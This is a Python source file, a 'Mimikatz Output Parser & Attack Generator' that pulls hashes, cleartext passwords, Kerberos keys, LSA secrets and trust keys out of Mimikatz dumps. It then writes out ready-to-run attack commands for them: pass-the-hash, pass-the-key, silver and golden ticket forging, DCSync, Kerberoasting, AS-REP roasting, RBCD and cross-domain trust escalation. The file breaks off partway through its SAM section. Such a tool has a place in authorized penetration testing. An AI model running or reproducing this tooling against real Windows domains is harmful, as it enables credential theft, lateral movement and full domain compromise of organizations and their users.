#!/usr/bin/env python3
"""
Mimikatz Output Parser & Attack Generator
Parses mimikatz output and generates attack commands for all extracted data
"""

import re
import sys
import argparse
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from collections import defaultdict

@dataclass
class Credential:
    username: str = ""
    domain: str = ""
    ntlm: str = ""
    sha1: str = ""
    password: str = ""
    dpapi: str = ""
    aes128: str = ""
    aes256: str = ""
    des_cbc_md5: str = ""
    sid: str = ""
    logon_server: str = ""
    session_type: str = ""
    is_machine_account: bool = False

@dataclass
class KerberosTicket:
    service: str = ""
    domain: str = ""
    enc_type: str = ""
    ticket_data: str = ""
    start_time: str = ""
    end_time: str = ""

@dataclass
class DCSyncData:
    username: str = ""
    domain: str = ""
    ntlm: str = ""
    lm: str = ""
    sid: str = ""
    aes256: str = ""
    aes128: str = ""

@dataclass
class LSASecret:
    name: str = ""
    data: str = ""

@dataclass
class SAMEntry:
    username: str = ""
    rid: str = ""
    ntlm: str = ""
    lm: str = ""

@dataclass
class TrustKey:
    domain: str = ""
    trust_type: str = ""
    ntlm: str = ""
    rc4: str = ""
    aes128: str = ""
    aes256: str = ""

@dataclass
class DPAPIKey:
    guid: str = ""
    masterkey: str = ""
    sha1: str = ""

@dataclass
class ParsedData:
    credentials: List[Credential] = field(default_factory=list)
    tickets: List[KerberosTicket] = field(default_factory=list)
    dcsync_data: List[DCSyncData] = field(default_factory=list)
    lsa_secrets: List[LSASecret] = field(default_factory=list)
    sam_entries: List[SAMEntry] = field(default_factory=list)
    trust_keys: List[TrustKey] = field(default_factory=list)
    dpapi_keys: List[DPAPIKey] = field(default_factory=list)
    domains: Set[str] = field(default_factory=set)
    dc_names: Set[str] = field(default_factory=set)


class MimikatzParser:
    def __init__(self, content: str):
        self.content = content
        self.data = ParsedData()
        
    def parse(self) -> ParsedData:
        self.parse_logonpasswords()
        self.parse_dcsync()
        self.parse_sam()
        self.parse_lsa_secrets()
        self.parse_tickets()
        self.parse_trust_keys()
        self.parse_dpapi()
        self.parse_vault()
        self.extract_domains()
        return self.data
    
    def parse_logonpasswords(self):
        auth_blocks = re.split(r'Authentication Id\s*:', self.content)
        for block in auth_blocks[1:]:
            cred = Credential()
            
            # Session type
            session_match = re.search(r'Session\s*:\s*(\w+)', block)
            if session_match:
                cred.session_type = session_match.group(1)
            
            # Username
            user_match = re.search(r'User Name\s*:\s*(\S+)', block)
            if user_match:
                cred.username = user_match.group(1)
            
            # Domain
            domain_match = re.search(r'Domain\s*:\s*(\S+)', block)
            if domain_match:
                cred.domain = domain_match.group(1)
            
            # SID
            sid_match = re.search(r'SID\s*:\s*(S-[\d-]+)', block)
            if sid_match:
                cred.sid = sid_match.group(1)
            
            # Logon Server
            logon_srv = re.search(r'Logon Server\s*:\s*(\S+)', block)
            if logon_srv and logon_srv.group(1) != '(null)':
                cred.logon_server = logon_srv.group(1)
                self.data.dc_names.add(logon_srv.group(1))
            
            # Check if machine account
            if cred.username and cred.username.endswith('$'):
                cred.is_machine_account = True
            
            # Parse msv section for hashes
            msv_match = re.search(r'msv\s*:.*?(?=tspkg|wdigest|kerberos|ssp|credman|$)', block, re.DOTALL)
            if msv_match:
                msv_block = msv_match.group(0)
                ntlm = re.search(r'\*\s*NTLM\s*:\s*([a-fA-F0-9]{32})', msv_block)
                sha1 = re.search(r'\*\s*SHA1\s*:\s*([a-fA-F0-9]{40})', msv_block)
                dpapi = re.search(r'\*\s*DPAPI\s*:\s*([a-fA-F0-9]+)', msv_block)
                if ntlm:
                    cred.ntlm = ntlm.group(1)
                if sha1:
                    cred.sha1 = sha1.group(1)
                if dpapi:
                    cred.dpapi = dpapi.group(1)
            
            # Parse kerberos section for password and keys
            kerb_match = re.search(r'kerberos\s*:.*?(?=ssp|credman|$)', block, re.DOTALL)
            if kerb_match:
                kerb_block = kerb_match.group(0)
                pwd = re.search(r'\*\s*Password\s*:\s*(.+?)(?:\r?\n|$)', kerb_block)
                if pwd and pwd.group(1).strip() not in ['(null)', '']:
                    cred.password = pwd.group(1).strip()
                aes256 = re.search(r'\*\s*aes256_hmac\s*:\s*([a-fA-F0-9]{64})', kerb_block)
                aes128 = re.search(r'\*\s*aes128_hmac\s*:\s*([a-fA-F0-9]{32})', kerb_block)
                if aes256:
                    cred.aes256 = aes256.group(1)
                if aes128:
                    cred.aes128 = aes128.group(1)
            
            # Parse wdigest
            wdigest_match = re.search(r'wdigest\s*:.*?(?=kerberos|ssp|credman|$)', block, re.DOTALL)
            if wdigest_match:
                wdigest_block = wdigest_match.group(0)
                pwd = re.search(r'\*\s*Password\s*:\s*(.+?)(?:\r?\n|$)', wdigest_block)
                if pwd and pwd.group(1).strip() not in ['(null)', ''] and not cred.password:
                    cred.password = pwd.group(1).strip()
            
            # Parse credman
            credman_match = re.search(r'credman\s*:.*?(?=Authentication Id|$)', block, re.DOTALL)
            if credman_match:
                credman_block = credman_match.group(0)
                cred_entries = re.findall(r'\*\s*Username\s*:\s*(\S+).*?\*\s*Password\s*:\s*(.+?)(?:\r?\n|$)', credman_block, re.DOTALL)
                for cred_user, cred_pass in cred_entries:
                    if cred_pass.strip() not in ['(null)', '']:
                        extra_cred = Credential()
                        extra_cred.username = cred_user
                        extra_cred.password = cred_pass.strip()
                        extra_cred.domain = cred.domain
                        self.data.credentials.append(extra_cred)
            
            if cred.username and cred.username not in ['(null)', 'DWM-1', 'DWM-2', 'UMFD-0', 'UMFD-1', 'UMFD-2']:
                self.data.credentials.append(cred)
    
    def parse_dcsync(self):
        # Pattern for DCSync output (lsadump::dcsync)
        dcsync_blocks = re.findall(
            r'Object RDN\s*:\s*(\S+).*?'
            r'SAM Username\s*:\s*(\S+).*?'
            r'Object Security ID\s*:\s*(S-[\d-]+).*?'
            r'Hash NTLM\s*:\s*([a-fA-F0-9]{32})',
            self.content, re.DOTALL
        )
        for rdn, sam_user, sid, ntlm in dcsync_blocks:
            dc = DCSyncData()
            dc.username = sam_user
            dc.sid = sid
            dc.ntlm = ntlm
            
            # Look for AES keys nearby
            aes256 = re.search(rf'{sam_user}.*?aes256_hmac\s*:\s*([a-fA-F0-9]{{64}})', self.content, re.DOTALL)
            aes128 = re.search(rf'{sam_user}.*?aes128_hmac\s*:\s*([a-fA-F0-9]{{32}})', self.content, re.DOTALL)
            if aes256:
                dc.aes256 = aes256.group(1)
            if aes128:
                dc.aes128 = aes128.group(1)
            
            self.data.dcsync_data.append(dc)
        
        # Alternative DCSync format
        alt_dcsync = re.findall(
            r'\*\s*Primary.*?'
            r'NTLM\s*:\s*([a-fA-F0-9]{32}).*?'
            r'ntlm-\s*0\s*:\s*([a-fA-F0-9]{32})',
            self.content, re.DOTALL
        )
    
    def parse_sam(self):
        sam_blocks = re.findall(
            r'RID\s*:\s*([a-fA-F0-9]+)\s*\(\d+\).*?'
            r'User\s*:\s*(\S+).*?'
            r'Hash NTLM\s*:\s*([a-fA-F0-9]{32})',
            self.content, re.DOTALL
        )
        for rid, user, ntlm in sam_blocks:
            entry = SAMEntry()
            entry.username = user
            entry.rid = rid
            entry.ntlm = ntlm
            self.data.sam_entries.append(entry)
        
        # Alternative SAM format
        alt_sam = re.findall(
            r'User\s*:\s*(\S+).*?'
            r'Hash NTLM\s*:\s*([a-fA-F0-9]{32})',
            self.content, re.DOTALL
        )
        existing_users = {e.username for e in self.data.sam_entries}
        for user, ntlm in alt_sam:
            if user not in existing_users:
                entry = SAMEntry()
                entry.username = user
                entry.ntlm = ntlm
                self.data.sam_entries.append(entry)
    
    def parse_lsa_secrets(self):
        # DPAPI system secrets
        dpapi_match = re.search(r'DPAPI_SYSTEM.*?full:\s*([a-fA-F0-9]+)', self.content, re.DOTALL)
        if dpapi_match:
            secret = LSASecret()
            secret.name = "DPAPI_SYSTEM"
            secret.data = dpapi_match.group(1)
            self.data.lsa_secrets.append(secret)
        
        # Service account passwords
        service_secrets = re.findall(
            r'_SC_(\S+).*?cur/text:\s*(.+?)(?:\r?\n|$)',
            self.content, re.DOTALL
        )
        for svc_name, svc_pass in service_secrets:
            if svc_pass.strip():
                secret = LSASecret()
                secret.name = f"_SC_{svc_name}"
                secret.data = svc_pass.strip()
                self.data.lsa_secrets.append(secret)
        
        # Default password
        defpwd = re.search(r'DefaultPassword.*?text:\s*(.+?)(?:\r?\n|$)', self.content)
        if defpwd:
            secret = LSASecret()
            secret.name = "DefaultPassword"
            secret.data = defpwd.group(1).strip()
            self.data.lsa_secrets.append(secret)
        
        # NL$KM (cached credentials key)
        nlkm = re.search(r'NL\$KM.*?:\s*([a-fA-F0-9]+)', self.content, re.DOTALL)
        if nlkm:
            secret = LSASecret()
            secret.name = "NL$KM"
            secret.data = nlkm.group(1)
            self.data.lsa_secrets.append(secret)
    
    def parse_tickets(self):
        # Kerberos tickets from sekurlsa::tickets or kerberos::list
        ticket_blocks = re.findall(
            r'Service Name\s*:\s*(\S+).*?'
            r'TargetName\s*:\s*(\S+).*?'
            r'Start/End/MaxRenew\s*:\s*(.+?)(?:\r?\n)',
            self.content, re.DOTALL
        )
        for svc, target, times in ticket_blocks:
            ticket = KerberosTicket()
            ticket.service = svc
            ticket.domain = target
            self.data.tickets.append(ticket)
        
        # Base64 tickets
        b64_tickets = re.findall(r'Base64 of file\s*:\s*([A-Za-z0-9+/=]+)', self.content)
        for b64 in b64_tickets:
            ticket = KerberosTicket()
            ticket.ticket_data = b64
            self.data.tickets.append(ticket)
    
    def parse_trust_keys(self):
        trust_blocks = re.findall(
            r'\[\s*In\s*\].*?'
            r'Domain\s*:\s*(\S+).*?'
            r'(?:rc4_hmac_nt|NTLM)\s*:\s*([a-fA-F0-9]{32})',
            self.content, re.DOTALL | re.IGNORECASE
        )
        for domain, key in trust_blocks:
            trust = TrustKey()
            trust.domain = domain
            trust.ntlm = key
            self.data.trust_keys.append(trust)
        
        # Alternative trust format
        alt_trust = re.findall(
            r'TRUST.*?Domain\s*:\s*(\S+).*?'
            r'Hash\s*NTLM\s*:\s*([a-fA-F0-9]{32})',
            self.content, re.DOTALL
        )
        existing = {t.domain for t in self.data.trust_keys}
        for domain, ntlm in alt_trust:
            if domain not in existing:
                trust = TrustKey()
                trust.domain = domain
                trust.ntlm = ntlm
                self.data.trust_keys.append(trust)
    
    def parse_dpapi(self):
        # DPAPI masterkeys
        mk_blocks = re.findall(
            r'GUID\s*:\s*\{([a-fA-F0-9-]+)\}.*?'
            r'MasterKey\s*:\s*([a-fA-F0-9]+)',
            self.content, re.DOTALL
        )
        for guid, mk in mk_blocks:
            key = DPAPIKey()
            key.guid = guid
            key.masterkey = mk
            self.data.dpapi_keys.append(key)
    
    def parse_vault(self):
        # Windows Vault credentials
        vault_creds = re.findall(
            r'TargetName\s*:\s*(\S+).*?'
            r'UserName\s*:\s*(\S+).*?'
            r'(?:Credential|Password)\s*:\s*(.+?)(?:\r?\n|$)',
            self.content, re.DOTALL
        )
        for target, user, cred in vault_creds:
            if cred.strip() and cred.strip() != '(null)':
                c = Credential()
                c.username = user
                c.password = cred.strip()
                self.data.credentials.append(c)
    
    def extract_domains(self):
        # Extract all domains found
        domains = re.findall(r'Domain\s*:\s*(\S+\.LOCAL|\S+\.local|\S+)', self.content)
        for d in domains:
            if d and d not in ['(null)', 'Window', 'Font', 'NT']:
                self.data.domains.add(d.upper().replace('.LOCAL', ''))


class AttackGenerator:
    def __init__(self, data: ParsedData):
        self.data = data
        self.output = []
        
    def generate_all(self) -> str:
        self.output = []
        
        # Get unique credentials
        unique_creds = self.deduplicate_credentials()
        
        self.generate_summary(unique_creds)
        self.generate_pth_attacks(unique_creds)
        self.generate_ptk_attacks(unique_creds)
        self.generate_overpass_the_hash(unique_creds)
        self.generate_password_attacks(unique_creds)
        self.generate_silver_ticket_attacks(unique_creds)
        self.generate_golden_ticket_attacks(unique_creds)
        self.generate_dcsync_attacks(unique_creds)
        self.generate_kerberoasting()
        self.generate_asreproasting()
        self.generate_machine_account_attacks(unique_creds)
        self.generate_trust_attacks()
        self.generate_sam_attacks()
        self.generate_lsa_secret_attacks()
        self.generate_dpapi_attacks()
        self.generate_lateral_movement(unique_creds)
        self.generate_persistence(unique_creds)
        self.generate_credential_spraying(unique_creds)
        self.generate_cracking_commands(unique_creds)
        
        return '\n'.join(self.output)
    
    def deduplicate_credentials(self) -> List[Credential]:
        seen = set()
        unique = []
        for cred in self.data.credentials:
            key = (cred.username, cred.domain, cred.ntlm, cred.password)
            if key not in seen and cred.username:
                seen.add(key)
                unique.append(cred)
        return unique
    
    def add_section(self, title: str):
        self.output.append(f"\n{'='*80}")
        self.output.append(f"[+] {title}")
        self.output.append('='*80)
    
    def add_subsection(self, title: str):
        self.output.append(f"\n[*] {title}")
        self.output.append('-'*60)
    
    def add_cmd(self, desc: str, cmd: str):
        self.output.append(f"# {desc}")
        self.output.append(cmd)
        self.output.append("")
    
    def generate_summary(self, creds: List[Credential]):
        self.add_section("EXTRACTED DATA SUMMARY")
        
        users_with_ntlm = [c for c in creds if c.ntlm and not c.is_machine_account]
        users_with_pwd = [c for c in creds if c.password and not c.is_machine_account]
        machine_accts = [c for c in creds if c.is_machine_account and c.ntlm]
        
        self.output.append(f"User accounts with NTLM: {len(users_with_ntlm)}")
        self.output.append(f"User accounts with cleartext: {len(users_with_pwd)}")
        self.output.append(f"Machine accounts: {len(machine_accts)}")
        self.output.append(f"SAM entries: {len(self.data.sam_entries)}")
        self.output.append(f"LSA secrets: {len(self.data.lsa_secrets)}")
        self.output.append(f"Trust keys: {len(self.data.trust_keys)}")
        self.output.append(f"DPAPI keys: {len(self.data.dpapi_keys)}")
        self.output.append(f"Domains found: {', '.join(self.data.domains) if self.data.domains else 'N/A'}")
        self.output.append(f"DC names: {', '.join(self.data.dc_names) if self.data.dc_names else 'N/A'}")
        
        self.add_subsection("Extracted Credentials")
        for c in users_with_ntlm:
            self.output.append(f"  {c.domain}\\{c.username} | NTLM: {c.ntlm}" + (f" | PWD: {c.password}" if c.password else ""))
        for c in users_with_pwd:
            if c not in users_with_ntlm:
                self.output.append(f"  {c.domain}\\{c.username} | PWD: {c.password}")
        
        if machine_accts:
            self.add_subsection("Machine Accounts")
            for c in machine_accts:
                self.output.append(f"  {c.domain}\\{c.username} | NTLM: {c.ntlm}")
    
    def generate_pth_attacks(self, creds: List[Credential]):
        ntlm_creds = [c for c in creds if c.ntlm]
        if not ntlm_creds:
            return
        
        self.add_section("PASS-THE-HASH ATTACKS")
        
        for c in ntlm_creds:
            domain = c.domain if c.domain else "DOMAIN"
            user = c.username
            ntlm = c.ntlm
            
            self.add_subsection(f"{domain}\\{user}")
            
            # Impacket tools
            self.add_cmd("PsExec (Impacket)", 
                f"impacket-psexec '{domain}/{user}@<TARGET>' -hashes ':{ntlm}'")
            self.add_cmd("WMIExec (Impacket)", 
                f"impacket-wmiexec '{domain}/{user}@<TARGET>' -hashes ':{ntlm}'")
            self.add_cmd("SMBExec (Impacket)", 
                f"impacket-smbexec '{domain}/{user}@<TARGET>' -hashes ':{ntlm}'")
            self.add_cmd("AtExec (Impacket)", 
                f"impacket-atexec '{domain}/{user}@<TARGET>' -hashes ':{ntlm}' 'whoami'")
            self.add_cmd("DCOMExec (Impacket)", 
                f"impacket-dcomexec '{domain}/{user}@<TARGET>' -hashes ':{ntlm}'")
            
            # CrackMapExec/NetExec
            self.add_cmd("CrackMapExec SMB", 
                f"crackmapexec smb <TARGET> -u '{user}' -H '{ntlm}' -d '{domain}'")
            self.add_cmd("CrackMapExec WinRM", 
                f"crackmapexec winrm <TARGET> -u '{user}' -H '{ntlm}' -d '{domain}'")
            self.add_cmd("CrackMapExec RDP", 
                f"crackmapexec rdp <TARGET> -u '{user}' -H '{ntlm}' -d '{domain}'")
            self.add_cmd("CrackMapExec MSSQL", 
                f"crackmapexec mssql <TARGET> -u '{user}' -H '{ntlm}' -d '{domain}'")
            self.add_cmd("CrackMapExec LDAP", 
                f"crackmapexec ldap <TARGET> -u '{user}' -H '{ntlm}' -d '{domain}'")
            
            # NetExec
            self.add_cmd("NetExec SMB", 
                f"nxc smb <TARGET> -u '{user}' -H '{ntlm}' -d '{domain}'")
            self.add_cmd("NetExec SMB Command Exec", 
                f"nxc smb <TARGET> -u '{user}' -H '{ntlm}' -d '{domain}' -x 'whoami /all'")
            self.add_cmd("NetExec SMB with SAM dump", 
                f"nxc smb <TARGET> -u '{user}' -H '{ntlm}' -d '{domain}' --sam")
            self.add_cmd("NetExec SMB with LSA dump", 
                f"nxc smb <TARGET> -u '{user}' -H '{ntlm}' -d '{domain}' --lsa")
            
            # Evil-WinRM
            self.add_cmd("Evil-WinRM", 
                f"evil-winrm -i <TARGET> -u '{user}' -H '{ntlm}'")
            
            # xfreerdp
            self.add_cmd("xfreerdp PTH", 
                f"xfreerdp /v:<TARGET> /u:'{user}' /d:'{domain}' /pth:{ntlm} /dynamic-resolution")
            
            # Mimikatz PTH
            self.add_cmd("Mimikatz PTH", 
                f"mimikatz.exe \"sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{ntlm} /run:cmd.exe\"")
            
            # Rubeus PTH
            self.add_cmd("Rubeus PTH (rc4)", 
                f"Rubeus.exe asktgt /user:{user} /domain:{domain} /rc4:{ntlm} /ptt")
    
    def generate_ptk_attacks(self, creds: List[Credential]):
        aes_creds = [c for c in creds if c.aes256 or c.aes128]
        if not aes_creds:
            return
        
        self.add_section("PASS-THE-KEY ATTACKS (AES)")
        
        for c in aes_creds:
            domain = c.domain if c.domain else "DOMAIN"
            user = c.username
            
            self.add_subsection(f"{domain}\\{user}")
            
            if c.aes256:
                self.add_cmd("Rubeus PTK (AES256)", 
                    f"Rubeus.exe asktgt /user:{user} /domain:{domain} /aes256:{c.aes256} /ptt")
                self.add_cmd("Impacket getTGT (AES256)", 
                    f"impacket-getTGT '{domain}/{user}' -aesKey '{c.aes256}'")
                self.add_cmd("Mimikatz PTK (AES256)", 
                    f"mimikatz.exe \"sekurlsa::pth /user:{user} /domain:{domain} /aes256:{c.aes256} /run:cmd.exe\"")
            
            if c.aes128:
                self.add_cmd("Rubeus PTK (AES128)", 
                    f"Rubeus.exe asktgt /user:{user} /domain:{domain} /aes128:{c.aes128} /ptt")
                self.add_cmd("Impacket getTGT (AES128)", 
                    f"impacket-getTGT '{domain}/{user}' -aesKey '{c.aes128}'")
    
    def generate_overpass_the_hash(self, creds: List[Credential]):
        ntlm_creds = [c for c in creds if c.ntlm and not c.is_machine_account]
        if not ntlm_creds:
            return
        
        self.add_section("OVERPASS-THE-HASH (OPTH)")
        
        for c in ntlm_creds:
            domain = c.domain if c.domain else "DOMAIN"
            user = c.username
            ntlm = c.ntlm
            
            self.add_subsection(f"{domain}\\{user}")
            
            self.add_cmd("Rubeus OPTH", 
                f"Rubeus.exe asktgt /user:{user} /domain:{domain} /rc4:{ntlm} /ptt")
            self.add_cmd("Mimikatz OPTH", 
                f"mimikatz.exe \"sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{ntlm} /run:'powershell -ep bypass'\"")
            self.add_cmd("Impacket getTGT", 
                f"impacket-getTGT '{domain}/{user}' -hashes ':{ntlm}'")
            self.add_cmd("Use TGT with Impacket", 
                f"export KRB5CCNAME={user}.ccache && impacket-psexec '{domain}/{user}@<TARGET>' -k -no-pass")
    
    def generate_password_attacks(self, creds: List[Credential]):
        pwd_creds = [c for c in creds if c.password]
        if not pwd_creds:
            return
        
        self.add_section("CLEARTEXT PASSWORD ATTACKS")
        
        for c in pwd_creds:
            domain = c.domain if c.domain else "DOMAIN"
            user = c.username
            pwd = c.password
            
            self.add_subsection(f"{domain}\\{user}")
            
            # Impacket
            self.add_cmd("PsExec", 
                f"impacket-psexec '{domain}/{user}:{pwd}@<TARGET>'")
            self.add_cmd("WMIExec", 
                f"impacket-wmiexec '{domain}/{user}:{pwd}@<TARGET>'")
            self.add_cmd("SMBClient", 
                f"impacket-smbclient '{domain}/{user}:{pwd}@<TARGET>'")
            self.add_cmd("SecretsDump", 
                f"impacket-secretsdump '{domain}/{user}:{pwd}@<TARGET>'")
            
            # CME/NXC
            self.add_cmd("CrackMapExec", 
                f"crackmapexec smb <TARGET> -u '{user}' -p '{pwd}' -d '{domain}'")
            self.add_cmd("NetExec", 
                f"nxc smb <TARGET> -u '{user}' -p '{pwd}' -d '{domain}'")
            
            # RDP
            self.add_cmd("xfreerdp", 
                f"xfreerdp /v:<TARGET> /u:'{user}' /d:'{domain}' /p:'{pwd}' /dynamic-resolution")
            
            # Evil-WinRM
            self.add_cmd("Evil-WinRM", 
                f"evil-winrm -i <TARGET> -u '{user}' -p '{pwd}'")
            
            # SSH (if available)
            self.add_cmd("SSH", 
                f"ssh '{domain}\\{user}'@<TARGET>")
            
            # Kerberos
            self.add_cmd("Get TGT (Impacket)", 
                f"impacket-getTGT '{domain}/{user}:{pwd}'")
            self.add_cmd("Rubeus asktgt", 
                f"Rubeus.exe asktgt /user:{user} /domain:{domain} /password:{pwd} /ptt")
    
    def generate_silver_ticket_attacks(self, creds: List[Credential]):
        machine_creds = [c for c in creds if c.is_machine_account and c.ntlm]
        if not machine_creds:
            return
        
        self.add_section("SILVER TICKET ATTACKS")
        self.output.append("# Silver tickets allow forging service tickets for specific services")
        self.output.append("# Replace <DOMAIN_SID> with actual domain SID (S-1-5-21-xxx-xxx-xxx)")
        self.output.append("")
        
        for c in machine_creds:
            domain = c.domain if c.domain else "DOMAIN"
            machine = c.username.rstrip('$')
            ntlm = c.ntlm
            
            self.add_subsection(f"Machine: {machine}")
            
            # Common services for silver tickets
            services = ['cifs', 'http', 'ldap', 'host', 'mssql', 'wsman']
            
            for svc in services:
                self.add_cmd(f"Silver Ticket for {svc.upper()} (Mimikatz)", 
                    f"mimikatz.exe \"kerberos::golden /user:Administrator /domain:{domain}.local /sid:<DOMAIN_SID> /target:{machine}.{domain}.local /service:{svc} /rc4:{ntlm} /ptt\"")
            
            self.add_cmd("Silver Ticket (Impacket)", 
                f"impacket-ticketer -nthash '{ntlm}' -domain-sid '<DOMAIN_SID>' -domain '{domain}.local' -spn 'cifs/{machine}.{domain}.local' 'Administrator'")
            
            self.add_cmd("Rubeus Silver Ticket", 
                f"Rubeus.exe silver /service:cifs/{machine}.{domain}.local /rc4:{ntlm} /sid:<DOMAIN_SID> /user:Administrator /domain:{domain}.local /ptt")
    
    def generate_golden_ticket_attacks(self, creds: List[Credential]):
        self.add_section("GOLDEN TICKET ATTACKS")
        self.output.append("# Golden tickets require krbtgt hash - use DCSync to obtain")
        self.output.append("# Replace <KRBTGT_NTLM> and <DOMAIN_SID> with actual values")
        self.output.append("")
        
        domains = list(self.data.domains) if self.data.domains else ['DOMAIN']
        
        for domain in domains:
            self.add_subsection(f"Domain: {domain}")
            
            self.add_cmd("Golden Ticket (Mimikatz)", 
                f"mimikatz.exe \"kerberos::golden /user:Administrator /domain:{domain}.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM> /ptt\"")
            
            self.add_cmd("Golden Ticket with AES256 (Mimikatz)", 
                f"mimikatz.exe \"kerberos::golden /user:Administrator /domain:{domain}.local /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /ptt\"")
            
            self.add_cmd("Golden Ticket (Impacket)", 
                f"impacket-ticketer -nthash '<KRBTGT_NTLM>' -domain-sid '<DOMAIN_SID>' -domain '{domain}.local' 'Administrator'")
            
            self.add_cmd("Rubeus Golden Ticket", 
                f"Rubeus.exe golden /rc4:<KRBTGT_NTLM> /sid:<DOMAIN_SID> /user:Administrator /domain:{domain}.local /ptt")
            
            self.add_cmd("Use Golden Ticket", 
                f"export KRB5CCNAME=Administrator.ccache && impacket-psexec '{domain}.local/Administrator@<DC>' -k -no-pass")
    
    def generate_dcsync_attacks(self, creds: List[Credential]):
        priv_creds = [c for c in creds if c.ntlm and not c.is_machine_account]
        if not priv_creds:
            return
        
        self.add_section("DCSYNC ATTACKS")
        self.output.append("# Requires Replicating Directory Changes privileges (Domain Admin, etc)")
        self.output.append("")
        
        for c in priv_creds:
            domain = c.domain if c.domain else "DOMAIN"
            user = c.username
            
            self.add_subsection(f"{domain}\\{user}")
            
            if c.ntlm:
                self.add_cmd("DCSync all users (Impacket)", 
                    f"impacket-secretsdump '{domain}/{user}@<DC>' -hashes ':{c.ntlm}' -just-dc")
                self.add_cmd("DCSync krbtgt only", 
                    f"impacket-secretsdump '{domain}/{user}@<DC>' -hashes ':{c.ntlm}' -just-dc-user krbtgt")
                self.add_cmd("DCSync specific user", 
                    f"impacket-secretsdump '{domain}/{user}@<DC>' -hashes ':{c.ntlm}' -just-dc-user Administrator")
                self.add_cmd("DCSync with NTDS extraction", 
                    f"impacket-secretsdump '{domain}/{user}@<DC>' -hashes ':{c.ntlm}'")
            
            if c.password:
                self.add_cmd("DCSync with password", 
                    f"impacket-secretsdump '{domain}/{user}:{c.password}@<DC>' -just-dc")
            
            self.add_cmd("Mimikatz DCSync", 
                f"mimikatz.exe \"lsadump::dcsync /domain:{domain}.local /user:krbtgt\"")
            self.add_cmd("Mimikatz DCSync all", 
                f"mimikatz.exe \"lsadump::dcsync /domain:{domain}.local /all /csv\"")
    
    def generate_kerberoasting(self):
        self.add_section("KERBEROASTING")
        
        creds_with_auth = [c for c in self.data.credentials if c.ntlm or c.password]
        if not creds_with_auth:
            self.output.append("# No credentials available for Kerberoasting")
            return
        
        for c in creds_with_auth[:3]:  # Limit to first 3
            domain = c.domain if c.domain else "DOMAIN"
            user = c.username
            
            self.add_subsection(f"Using {domain}\\{user}")
            
            if c.ntlm:
                self.add_cmd("GetUserSPNs (Impacket)", 
                    f"impacket-GetUserSPNs '{domain}/{user}' -hashes ':{c.ntlm}' -dc-ip <DC_IP> -request")
                self.add_cmd("CrackMapExec Kerberoast", 
                    f"crackmapexec ldap <DC_IP> -u '{user}' -H '{c.ntlm}' -d '{domain}' --kerberoasting kerberoast.txt")
            
            if c.password:
                self.add_cmd("GetUserSPNs with password", 
                    f"impacket-GetUserSPNs '{domain}/{user}:{c.password}' -dc-ip <DC_IP> -request")
            
            self.add_cmd("Rubeus Kerberoast", 
                "Rubeus.exe kerberoast /outfile:kerberoast.txt")
            self.add_cmd("Rubeus Kerberoast (RC4 only)", 
                "Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.txt")
        
        self.add_subsection("Crack Kerberoast Hashes")
        self.add_cmd("Hashcat TGS-REP (RC4)", 
            "hashcat -m 13100 kerberoast.txt wordlist.txt")
        self.add_cmd("Hashcat TGS-REP (AES256)", 
            "hashcat -m 19700 kerberoast.txt wordlist.txt")
        self.add_cmd("John", 
            "john --wordlist=wordlist.txt kerberoast.txt")
    
    def generate_asreproasting(self):
        self.add_section("AS-REP ROASTING")
        
        domains = list(self.data.domains) if self.data.domains else ['DOMAIN']
        
        for domain in domains:
            self.add_subsection(f"Domain: {domain}")
            
            self.add_cmd("GetNPUsers without auth", 
                f"impacket-GetNPUsers '{domain}.local/' -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.txt")
            
            # With credentials
            creds_with_auth = [c for c in self.data.credentials if (c.ntlm or c.password) and not c.is_machine_account]
            for c in creds_with_auth[:1]:
                if c.ntlm:
                    self.add_cmd("GetNPUsers with NTLM", 
                        f"impacket-GetNPUsers '{domain}/{c.username}' -hashes ':{c.ntlm}' -dc-ip <DC_IP> -request")
                if c.password:
                    self.add_cmd("GetNPUsers with password", 
                        f"impacket-GetNPUsers '{domain}/{c.username}:{c.password}' -dc-ip <DC_IP> -request")
            
            self.add_cmd("Rubeus ASREPRoast", 
                "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt")
            self.add_cmd("CrackMapExec ASREPRoast", 
                f"crackmapexec ldap <DC_IP> -d '{domain}' -u '' -p '' --asreproast asrep.txt")
        
        self.add_subsection("Crack AS-REP Hashes")
        self.add_cmd("Hashcat AS-REP", 
            "hashcat -m 18200 asrep.txt wordlist.txt")
    
    def generate_machine_account_attacks(self, creds: List[Credential]):
        machine_creds = [c for c in creds if c.is_machine_account and (c.ntlm or c.password)]
        if not machine_creds:
            return
        
        self.add_section("MACHINE ACCOUNT ATTACKS")
        
        for c in machine_creds:
            domain = c.domain if c.domain else "DOMAIN"
            machine = c.username
            
            self.add_subsection(f"{domain}\\{machine}")
            
            if c.ntlm:
                self.add_cmd("Enumerate with machine account", 
                    f"crackmapexec smb <DC_IP> -u '{machine}' -H '{c.ntlm}' -d '{domain}'")
                self.add_cmd("LDAP enumeration", 
                    f"crackmapexec ldap <DC_IP> -u '{machine}' -H '{c.ntlm}' -d '{domain}' --users")
                self.add_cmd("BloodHound collection", 
                    f"bloodhound-python -u '{machine}' --hashes ':{c.ntlm}' -d '{domain}.local' -dc <DC> -c all")
                self.add_cmd("RBCD Attack prep", 
                    f"impacket-rbcd '{domain}/{machine}' -hashes ':{c.ntlm}' -delegate-to '<TARGET_MACHINE>$' -action write")
            
            if c.password:
                self.add_cmd("Machine account with password", 
                    f"crackmapexec smb <DC_IP> -u '{machine}' -p '{c.password}' -d '{domain}'")
    
    def generate_trust_attacks(self):
        if not self.data.trust_keys:
            return
        
        self.add_section("DOMAIN TRUST ATTACKS")
        
        for trust in self.data.trust_keys:
            self.add_subsection(f"Trust: {trust.domain}")
            
            if trust.ntlm:
                self.add_cmd("Inter-realm TGT (Mimikatz)", 
                    f"mimikatz.exe \"kerberos::golden /user:Administrator /domain:<CURRENT_DOMAIN> /sid:<CURRENT_SID> /sids:<TARGET_EA_SID>-519 /krbtgt:{trust.ntlm} /ptt\"")
                self.add_cmd("Trust ticket (Impacket)", 
                    f"impacket-raiseChild '<CURRENT_DOMAIN>/Administrator' -hashes ':{trust.ntlm}' '<TARGET_DOMAIN>'")
    
    def generate_sam_attacks(self):
        if not self.data.sam_entries:
            return
        
